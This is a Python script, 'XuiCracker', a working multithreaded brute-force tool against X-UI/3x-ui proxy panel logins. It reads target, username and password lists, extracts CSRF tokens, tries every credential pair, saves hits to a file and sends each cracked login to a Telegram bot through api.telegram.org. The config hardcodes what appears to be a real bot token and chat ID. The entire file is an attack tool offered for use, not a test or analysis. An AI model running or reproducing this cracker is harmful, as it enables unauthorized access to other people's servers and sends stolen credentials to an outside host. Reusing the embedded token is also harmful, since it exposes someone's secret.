#!/usr/bin/env python3
# XuiCracker v2.3 — Interactive

import requests
import threading
import sys
import re
import time
import os
import traceback
from urllib.parse import urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

VERSION = "V2.3"

# ═══════════════════════════════════════════════════════════
#  🛠️  CONFIG — اینجا رو پر کن
# ═══════════════════════════════════════════════════════════
TG_TOKEN   = "8890435566:AAGqFX0U8Fp7PKoymaqNAMNE4h17BXmHwGI"
TG_CHAT    = "6306660115"

OUTPUT_FILE   = "good.txt"
TIMEOUT       = 8
RETRIES       = 1
COOKIE        = None

NOTIFY_ON_START  = True
NOTIFY_ON_HIT    = True
NOTIFY_ON_FINISH = True
SEND_GOOD_FILE   = False
# ═══════════════════════════════════════════════════════════

class C:
    H='\033[95m'; B='\033[94m'; CY='\033[96m'; G='\033[92m'
    Y='\033[93m'; R='\033[91m'; W='\033[97m'; E='\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""{C.R}
╔══════════════════════════════════════════════════════════════╗
║{C.CY}   XUI CRACKER {VERSION}                                 {C.R}║
║{C.Y}   {datetime.now():%Y-%m-%d %H:%M:%S}                                  {C.R}║
╚══════════════════════════════════════════════════════════════╝{C.E}""")

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0; self.found = 0
        self.failed = 0; self.bad = 0; self.errors = 0
    def inc(self, key, n=1):
        with self.lock:
            setattr(self, key, getattr(self, key) + n)
    def snap(self):
        with self.lock:
            return {"total": self.total, "found": self.found,
                    "failed": self.failed, "bad": self.bad,
                    "errors": self.errors}

STATS = Stats()
DRAW_STOP = threading.Event()

def draw():
    while not DRAW_STOP.is_set():
        s = STATS.snap()
        clear()
        banner()
        print(f"{C.B}╔══════════════════════════════════════════════════╗")
        print(f"{C.B}║{C.Y}  📊 LIVE STATS                        {C.B}║")
        print(f"{C.B}╠══════════════════════════════════════════════════╣")
        print(f"{C.B}║{C.CY}  Attempts : {C.W}{s['total']:<24}{C.B}║")
        print(f"{C.B}║{C.G}  ✅ Found  : {C.G}{s['found']:<24}{C.B}║")
        print(f"{C.B}║{C.R}  ❌ Failed : {C.R}{s['failed']:<24}{C.B}║")
        print(f"{C.B}║{C.Y}  ⚠️  Bad    : {C.Y}{s['bad']:<24}{C.B}║")
        print(f"{C.B}║{C.H}  🐛 Errors : {C.H}{s['errors']:<24}{C.B}║")
        print(f"{C.B}╚══════════════════════════════════════════════════╝{C.E}")
        time.sleep(0.6)

class Telegram:
    def __init__(self, token, chat):
        self.token = token
        self.chat  = str(chat)
        self.enabled = bool(token and chat
                            and token != "PASTE_YOUR_BOT_TOKEN_HERE"
                            and chat  != "PASTE_YOUR_CHAT_ID_HERE")
        self.lock = threading.Lock()
        self.base = f"https://api.telegram.org/bot{token}" if token else None

    def send(self, text):
        if not self.enabled: return
        with self.lock:
            try:
                r = requests.post(
                    f"{self.base}/sendMessage",
                    json={"chat_id": self.chat, "text": text,
                          "parse_mode": "HTML",
                          "disable_web_page_preview": True},
                    timeout=10,
                )
                if r.status_code != 200:
                    print(f"{C.R}[!] tg non-200: {r.status_code} {r.text[:120]}{C.E}")
            except Exception as e:
                print(f"{C.R}[!] tg failed: {e}{C.E}")

    def send_file(self, path):
        if not self.enabled or not os.path.exists(path): return
        try:
            with open(path, "rb") as f:
                requests.post(
                    f"{self.base}/sendDocument",
                    data={"chat_id": self.chat},
                    files={"document": f},
                    timeout=20,
                )
        except Exception as e:
            print(f"{C.R}[!] tg file failed: {e}{C.E}")

    def hit(self, target, user, password, idx=None):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = (f"🎯 <b>XUI HIT</b>\n"
               f"🕒 <code>{now}</code>\n"
               f"🌐 <code>{target}</code>\n"
               f"👤 <code>{user}</code>\n"
               f"🔑 <code>{password}</code>")
        if idx is not None:
            msg += f"\n🎰 attempt #{idx}"
        self.send(msg)

def ask_path(prompt, kind):
    while True:
        print()
        print(f"{C.B}┌─────────────────────────────────────────────┐")
        print(f"{C.B}│ {C.Y}{prompt:<42}{C.B} │")
        print(f"{C.B}└─────────────────────────────────────────────┘{C.E}")
        print(f"{C.CY}  [{kind}] {C.W}paste path or drag file here, then Enter:{C.E}")
        try:
            raw = input(f"  {C.G}>{C.E} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{C.R}[!] cancelled{C.E}")
            sys.exit(0)

        raw = raw.strip().strip('"').strip("'").strip()
        if raw.startswith("& "):
            raw = raw[2:].strip()
        if raw.startswith("file:///"):
            raw = raw[8:]

        if not raw:
            print(f"{C.R}  ✗ empty. try again.{C.E}")
            continue

        if not os.path.exists(raw):
            print(f"{C.R}  ✗ not found: {raw}{C.E}")
            continue

        if not os.path.isfile(raw):
            print(f"{C.R}  ✗ not a file: {raw}{C.E}")
            continue

        try:
            with open(raw, encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f
                         if l.strip() and not l.strip().startswith("#")]
        except Exception as e:
            print(f"{C.R}  ✗ can't read: {e}{C.E}")
            continue

        if not lines:
            print(f"{C.R}  ✗ file is empty.{C.E}")
            continue

        print(f"{C.G}  ✓ loaded {len(lines)} entries from {os.path.basename(raw)}{C.E}")
        return raw, lines

def ask_int(prompt, default, min_val=1, max_val=500):
    print()
    print(f"{C.B}┌─────────────────────────────────────────────┐")
    print(f"{C.B}│ {C.Y}{prompt:<42}{C.B} │")
    print(f"{C.B}└─────────────────────────────────────────────┘{C.E}")
    print(f"{C.CY}  [default: {default}]  Enter to accept, or type a number:{C.E}")
    try:
        raw = input(f"  {C.G}>{C.E} ").strip()
    except (EOFError, KeyboardInterrupt):
        print(f"\n{C.R}[!] cancelled{C.E}")
        sys.exit(0)
    if not raw:
        return default
    try:
        v = int(raw)
        if v < min_val: v = min_val
        if v > max_val: v = max_val
        return v
    except Exception:
        print(f"{C.Y}  ! invalid, using default {default}{C.E}")
        return default

def normalize_target(raw):
    raw = raw.strip().rstrip("/")
    if raw.startswith(("http://", "https://")):
        return [raw]
    return [f"https://{raw}", f"http://{raw}"]

CSRF_PATTERNS = [
    r'name="csrf_token"\s+value="([^"]+)"',
    r'csrf-token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    r'x-csrf-token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    r'<meta[^>]+csrf-token[^>]+content=["\']([^"\']+)["\']',
    r'var\s+csrf_token\s*=\s*["\']([^"\']+)["\']',
    r'name=["\']_csrf["\']\s+value=["\']([^"\']+)["\']',
]

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/124.0.0.0 Safari/537.36")

def new_session(cookie=None):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Accept": "*/*",
                      "Accept-Language": "en-US,en;q=0.9",
                      "Connection": "keep-alive"})
    if cookie:
        s.cookies.set("3x-ui", cookie)
    return s

def get_csrf(session, target, timeout=8):
    try:
        r = session.get(target + "/", timeout=timeout, allow_redirects=True)
        for p in CSRF_PATTERNS:
            m = re.search(p, r.text, re.IGNORECASE)
            if m: return m.group(1)
        hdr = r.headers.get("x-csrf-token")
        if hdr: return hdr
        return None
    except Exception:
        return None

def try_login(session, target, user, password, csrf, timeout=8, retries=1):
    login_url = urljoin(target + "/", "login")
    payload = {"username": user, "password": password, "twoFactorCode": ""}
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": target, "Referer": target + "/login", "Accept": "*/*",
    }
    if csrf: headers["x-csrf-token"] = csrf

    for attempt in range(retries + 1):
        try:
            r = session.post(login_url, data=payload, headers=headers,
                             timeout=timeout, allow_redirects=False)
            if r.status_code in (401, 403, 429, 503):
                return False
            try:
                j = r.json()
                if isinstance(j, dict) and j.get("success") is True:
                    return True
                return False
            except Exception:
                txt = r.text.lower()
                if any(k in txt for k in ("dashboard", "panel", "logout")):
                    return True
                return False
        except (requests.exceptions.Timeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.SSLError):
            if attempt < retries:
                time.sleep(1.0 + attempt); continue
            return False
        except Exception:
            return False
    return False

def crack_target(raw_ip, users, passwords, cfg, notifier, out_lock, stop_event):
    targets = normalize_target(raw_ip)
    session = new_session(cfg["cookie"])
    real_target = None
    csrf = None

    for t in targets:
        csrf = get_csrf(session, t, timeout=cfg["timeout"])
        if csrf:
            real_target = t
            break

    if not real_target:
        STATS.inc("bad"); return

    combos = [(u, p) for u in users for p in passwords]
    hit = {"done": False}

    def worker(item):
        idx, (u, p) = item
        if stop_event.is_set() or hit["done"]: return
        STATS.inc("total")
        try:
            ok = try_login(session, real_target, u, p, csrf,
                           timeout=cfg["timeout"], retries=cfg["retries"])
        except Exception:
            STATS.inc("errors"); return
        if ok and not hit["done"]:
            hit["done"] = True
            STATS.inc("found")
            stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            line = f"{real_target} | {u}:{p} | {stamp}\n"
            with out_lock:
                with open(cfg["out"], "a", encoding="utf-8") as f:
                    f.write(line)
            print(f"\n{C.G}[+] HIT  {real_target}  {u}:{p}{C.E}")
            if cfg["notify_hit"]:
                notifier.hit(real_target, u, p, idx)
                if cfg["send_file"]:
                    notifier.send_file(cfg["out"])

    with ThreadPoolExecutor(max_workers=cfg["threads_per_target"]) as ex:
        futures = [ex.submit(worker, (i, c)) for i, c in enumerate(combos, 1)]
        for _ in as_completed(futures):
            if hit["done"] or stop_event.is_set(): break

    if not hit["done"]:
        STATS.inc("failed")

def main():
    banner()

    print(f"{C.H}  interactive mode — answer the prompts below{C.E}")

    ip_path, ips = ask_path("1/3  IP / HOST list", "IPS")
    user_path, users = ask_path("2/3  USERNAME list", "USERS")
    pass_path, passwords = ask_path("3/3  PASSWORD list", "PASSWORDS")

    threads_per_target = ask_int("4/6  threads per target", 10, 1, 100)
    parallel_targets = ask_int("5/6  parallel targets", 5, 1, 100)
    timeout = ask_int("6/6  timeout (seconds)", 8, 2, 60)

    clear()
    banner()
    print(f"{C.G}╔══════════════════════════════════════════════════╗")
    print(f"{C.G}║{C.W}  ✅ CONFIG READY                             {C.G}║")
    print(f"{C.G}╠══════════════════════════════════════════════════╣")
    print(f"{C.G}║{C.CY}  ips       : {C.W}{len(ips):<32}{C.G}║")
    print(f"{C.G}║{C.CY}  users     : {C.W}{len(users):<32}{C.G}║")
    print(f"{C.G}║{C.CY}  passwords : {C.W}{len(passwords):<32}{C.G}║")
    print(f"{C.G}║{C.CY}  threads   : {C.W}{threads_per_target:<32}{C.G}║")
    print(f"{C.G}║{C.CY}  parallel  : {C.W}{parallel_targets:<32}{C.G}║")
    print(f"{C.G}║{C.CY}  timeout   : {C.W}{timeout:<32}{C.G}║")
    print(f"{C.G}║{C.CY}  total     : {C.W}{len(ips)*len(users)*len(passwords):<32}{C.G}║")
    print(f"{C.G}╚══════════════════════════════════════════════════╝{C.E}")
    print()
    input(f"{C.Y}  press Enter to start cracking...{C.E}")

    cfg = {
        "cookie": COOKIE,
        "timeout": timeout,
        "retries": RETRIES,
        "threads_per_target": threads_per_target,
        "out": OUTPUT_FILE,
        "notify_hit": NOTIFY_ON_HIT,
        "send_file": SEND_GOOD_FILE,
    }

    notifier = Telegram(TG_TOKEN, TG_CHAT)
    if not notifier.enabled:
        print(f"{C.Y}[!] telegram disabled (token/chat not set){C.E}")

    if notifier.enabled and NOTIFY_ON_START:
        notifier.send(
            f"🚀 <b>XUI Cracker started</b>\n"
            f"targets: {len(ips)}\n"
            f"users: {len(users)}\n"
            f"passwords: {len(passwords)}\n"
            f"combos/target: {len(users)*len(passwords)}\n"
            f"time: <code>{datetime.now():%Y-%m-%d %H:%M:%S}</code>"
        )

    with open(cfg["out"], "a", encoding="utf-8") as f:
        f.write(f"\n# --- run {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")

    out_lock = threading.Lock()
    stop_event = threading.Event()

    t_draw = threading.Thread(target=draw, daemon=True)
    t_draw.start()

    try:
        with ThreadPoolExecutor(max_workers=parallel_targets) as ex:
            futs = [ex.submit(crack_target, ip, users, passwords, cfg,
                              notifier, out_lock, stop_event) for ip in ips]
            for _ in as_completed(futs):
                pass
    except KeyboardInterrupt:
        print(f"\n{C.R}[!] interrupted{C.E}")
        stop_event.set()
    except Exception as e:
        print(f"\n{C.R}[!] fatal: {e}{C.E}")
        traceback.print_exc()
    finally:
        stop_event.set()
        DRAW_STOP.set()
        time.sleep(1)
        s = STATS.snap()
        print(f"\n{C.G}[+] done. found={s['found']} failed={s['failed']} "
              f"bad={s['bad']} errors={s['errors']}{C.E}")
        print(f"{C.G}[+] results -> {cfg['out']}{C.E}")
        if notifier.enabled and NOTIFY_ON_FINISH:
            notifier.send(
                f"✅ <b>XUI Cracker finished</b>\n"
                f"found: {s['found']}\n"
                f"failed: {s['failed']}\n"
                f"bad: {s['bad']}\n"
                f"errors: {s['errors']}\n"
                f"total: {s['total']}"
            )
        input("\npress enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{C.R}[!] crash: {e}{C.E}")
        traceback.print_exc()
        input("press enter to exit...")
